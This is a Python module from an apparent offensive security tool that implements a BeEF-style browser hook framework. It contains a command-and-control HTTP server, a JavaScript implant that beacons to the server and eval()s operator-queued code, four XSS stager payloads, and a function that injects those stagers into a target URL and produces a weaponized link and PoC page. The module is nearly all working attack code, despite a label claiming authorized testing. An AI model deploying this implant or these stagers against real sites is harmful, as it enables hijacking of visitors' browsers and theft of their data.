"""Built-in BeEF-like Browser Exploitation Framework (Hook C2 Server + Stager Generator + XSS Handoff)."""
import http.server
import json
import socketserver
import threading
import time
import urllib.parse
import uuid
from core.config import BEEF_HOST, BEEF_PORT
from core.http import get
from core.memory import log_event

_BEEF_LOCK = threading.RLock()
_GLOBAL_BEEF = None

HOOK_JS_TEMPLATE = """/* bugsBounty BeEF-Style Browser Implant (Authorized Security Testing) */
(function(){
  var FID = __FID__;
  var BEEF_ENDPOINT = __C2_BASE__;
  var C2 = BEEF_ENDPOINT;
  var SID = Math.random().toString(36).slice(2) + Date.now().toString(36);
  function send(ep, payload) {
    try {
      fetch(C2 + ep + "?sid=" + encodeURIComponent(SID) + "&fid=" + encodeURIComponent(FID), {
        method: "POST",
        mode: "cors",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
      }).catch(function(){});
    } catch (e) {}
  }
  send("/beacon", {
    fid: FID,
    sid: SID,
    href: String(location.href),
    origin: String(location.origin),
    cookie_len: (document.cookie || "").length,
    forms: document.forms ? document.forms.length : 0,
    ua: navigator.userAgent,
    ts: Date.now()
  });
  setInterval(function(){
    fetch(C2 + "/poll?session=" + encodeURIComponent(SID))
      .then(function(r){ return r.json(); })
      .then(function(cmds){
        (cmds.commands || cmds.queue || []).forEach(function(cmd){
          var out = null;
          try { out = String(eval(cmd.js)); } catch (err) { out = "ERR:" + err; }
          send("/result", {id: cmd.id, cmd_id: cmd.id, session: SID, output: out});
        });
      }).catch(function(){});
  }, 2500);
})();
"""


class BeefServer:
    def __init__(self, host: str = BEEF_HOST, port: int = BEEF_PORT):
        self.host = host
        self.port = port
        self._httpd = None
        self._thread = None
        self.sessions: dict[str, dict] = {}
        self.script_pulls: list[dict] = []
        self.command_queues: dict[str, list[dict]] = {}
        self.command_results: dict[str, list[dict]] = {}
        self._cmd_to_session: dict[str, tuple[str, dict]] = {}
        self._lock = threading.RLock()

    @property
    def base_url(self) -> str:
        return f"http://{self.host}:{self.port}"

    def hook_url(self, finding_id: str = "probe") -> str:
        return f"{self.base_url}/hook.js"

    def start(self) -> str:
        with self._lock:
            if self._httpd is not None:
                return self.base_url
            srv = self

            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *args):
                    pass

                def _cors(self, status=200, ctype="application/json"):
                    self.send_response(status)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Access-Control-Allow-Origin", "*")
                    self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
                    self.send_header("Access-Control-Allow-Headers", "Content-Type")
                    self.end_headers()

                def do_OPTIONS(self):
                    self._cors(204)

                def do_GET(self):
                    parsed = urllib.parse.urlparse(self.path)
                    qs = urllib.parse.parse_qs(parsed.query)
                    if parsed.path in ("/hook.js", "/beef/hook.js"):
                        fid = (qs.get("fid") or ["default"])[0]
                        with srv._lock:
                            srv.script_pulls.append({
                                "fid": fid,
                                "remote": self.client_address[0],
                                "ua": self.headers.get("User-Agent", ""),
                                "referer": self.headers.get("Referer", ""),
                                "ts": time.time(),
                            })
                        js = (
                            HOOK_JS_TEMPLATE
                            .replace("__FID__", json.dumps(fid))
                            .replace("__C2_BASE__", json.dumps(srv.base_url))
                        )
                        self._cors(200, "application/javascript; charset=utf-8")
                        self.wfile.write(js.encode())
                        return

                    if parsed.path in ("/poll", "/c2/poll"):
                        sid = (qs.get("session") or qs.get("sid") or qs.get("session_id") or [""])[0]
                        with srv._lock:
                            q = srv.command_queues.pop(sid, [])
                        self._cors(200)
                        self.wfile.write(json.dumps({"queue": q, "commands": q}).encode())
                        return

                    if parsed.path == "/api/hooks":
                        with srv._lock:
                            payload = {
                                "hook_endpoint": srv.hook_url(),
                                "sessions": srv.sessions,
                                "script_pulls": srv.script_pulls[-50:],
                                "results": srv.command_results,
                            }
                        self._cors(200)
                        self.wfile.write(json.dumps(payload, default=str).encode())
                        return

                    self._cors(200)
                    self.wfile.write(json.dumps({"beef": "online", "hooks": len(srv.sessions)}).encode())

                def do_POST(self):
                    parsed = urllib.parse.urlparse(self.path)
                    qs = urllib.parse.parse_qs(parsed.query)
                    length = int(self.headers.get("Content-Length", "0") or 0)
                    raw = self.rfile.read(min(length, 65536)).decode(errors="ignore")
                    try:
                        body = json.loads(raw) if raw else {}
                    except Exception:
                        body = {"raw": raw}

                    sid = (
                        qs.get("session")
                        or qs.get("sid")
                        or qs.get("session_id")
                        or [body.get("session") or body.get("sid") or body.get("session_id") or ""]
                    )[0]
                    fid = (
                        qs.get("fid")
                        or qs.get("finding_id")
                        or [body.get("finding_id") or body.get("fid") or "default"]
                    )[0]

                    if parsed.path in ("/beacon", "/c2/beacon"):
                        if not sid:
                            sid = str(uuid.uuid4())[:8]
                        with srv._lock:
                            existing = srv.sessions.get(sid, {})
                            srv.sessions[sid] = {
                                "session": sid,
                                "sid": sid,
                                "finding_id": fid,
                                "fid": fid,
                                "remote": self.client_address[0],
                                "telemetry": body,
                                "commands": existing.get("commands", []),
                                "first_seen": existing.get("first_seen", time.time()),
                                "last_seen": time.time(),
                            }
                        self._cors(200)
                        self.wfile.write(json.dumps({"hooked": True, "sid": sid, "session": sid}).encode())
                        return

                    if parsed.path in ("/result", "/c2/result"):
                        cmd_id = body.get("id") or body.get("cmd_id") or ""
                        with srv._lock:
                            if not sid and cmd_id in srv._cmd_to_session:
                                sid = srv._cmd_to_session[cmd_id][0]
                            srv.command_results.setdefault(sid or "default", []).append(body)
                            if sid in srv.sessions:
                                srv.sessions[sid].setdefault("commands", []).append(body)
                        self._cors(200)
                        self.wfile.write(json.dumps({"ok": True}).encode())
                        return

                    self._cors(404)
                    self.wfile.write(b"{}")

            try:
                socketserver.ThreadingTCPServer.allow_reuse_address = True
                httpd = socketserver.ThreadingTCPServer((self.host, self.port), Handler)
            except OSError:
                httpd = socketserver.ThreadingTCPServer((self.host, 0), Handler)
                self.port = httpd.server_address[1]

            self._httpd = httpd
            self._thread = threading.Thread(target=httpd.serve_forever, daemon=True, name="BeefHookC2")
            self._thread.start()
            return self.base_url

    def list_sessions(self) -> dict:
        with self._lock:
            return dict(self.sessions)

    def get_sessions(self, finding_id: str | None = None) -> list[dict]:
        with self._lock:
            vals = list(self.sessions.values())
            if finding_id is not None:
                return [s for s in vals if s.get("finding_id") == finding_id or s.get("fid") == finding_id]
            return vals

    def queue_command(self, sid: str, js_code: str) -> str:
        cmd_id = f"cmd-{uuid.uuid4().hex[:6]}"
        entry = {"id": cmd_id, "js": js_code}
        with self._lock:
            self.command_queues.setdefault(sid, []).append(entry)
            self._cmd_to_session[cmd_id] = (sid, entry)
        return cmd_id

    def stop(self):
        with self._lock:
            if self._httpd is not None:
                self._httpd.shutdown()
                self._httpd.server_close()
                self._httpd = None


def get_beef_server() -> BeefServer:
    global _GLOBAL_BEEF
    with _BEEF_LOCK:
        if _GLOBAL_BEEF is None:
            _GLOBAL_BEEF = BeefServer()
        _GLOBAL_BEEF.start()
        return _GLOBAL_BEEF


def generate_beef_stagers(hook_js_url: str) -> list[tuple[str, str]]:
    return [
        ("svg_fetch_eval", f"\"><svg/onload=\"fetch('{hook_js_url}').then(r=>r.text()).then(eval)\">"),
        ("img_dynamic_dom", f"'><img src=x onerror=\"var s=document.createElement('script');s.src='{hook_js_url}';document.head.appendChild(s)\">"),
        ("details_ontoggle_hook", f"<details/open/ontoggle=\"import('{hook_js_url}')\">"),
        ("external_script", f"<script src='{hook_js_url}'></script>"),
    ]


def handoff_xss_to_beef(url: str, param: str = "", finding_id: str = "xss") -> dict:
    srv = get_beef_server()
    hook_u = srv.hook_url(finding_id)
    stagers = generate_beef_stagers(hook_u)

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    target_param = param or (list(qs.keys())[0] if qs else "q")

    deliverable = []
    csp_blocks_external = False
    weaponized_url = url

    for sname, spayload in stagers:
        q = dict(qs)
        q[target_param] = [spayload]
        probe_u = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
        r = get(probe_u)
        if r.status == 0:
            continue
        csp = (r.headers.get("content-security-policy") or "").lower()
        if "script-src" in csp and "'unsafe-inline'" not in csp and "*" not in csp:
            csp_blocks_external = True
        if hook_u in (r.text or "") or ("onload=" in (r.text or "").lower() and "fetch(" in (r.text or "").lower()):
            deliverable.append({"name": sname, "stager": sname, "payload": spayload, "weaponized_url": probe_u, "verified_in_dom": True})
            if weaponized_url == url:
                weaponized_url = probe_u

    implant_check = get(hook_u)
    c2_live = implant_check.status == 200 and "BEEF_ENDPOINT" in (implant_check.text or "")

    log_event(parsed.netloc, "beef_handoff", {
        "url": url,
        "hook_url": hook_u,
        "deliverable_stagers": len(deliverable),
        "c2_live": c2_live,
    })
    best = deliverable[0] if deliverable else {"name": stagers[0][0], "stager": stagers[0][0], "payload": stagers[0][1], "weaponized_url": weaponized_url, "verified_in_dom": False}
    html_poc = (
        f"<!doctype html><html><head><title>BeEF XSS PoC ({finding_id})</title></head>"
        f"<body><h2>Authorized BeEF XSS Proof of Concept</h2>"
        f"<p>Hook C2 URL: <code>{hook_u}</code></p>"
        f"<iframe src=\"{best['weaponized_url']}\" width=\"800\" height=\"350\"></iframe></body></html>"
    )
    return {
        "c2_base": srv.base_url,
        "hook_url": hook_u,
        "c2_live": c2_live,
        "csp_restricts_script": csp_blocks_external,
        "stagers": deliverable,
        "deliverable_stagers": deliverable,
        "best_stager": best,
        "html_poc": html_poc,
        "active_sessions": len(srv.sessions),
    }
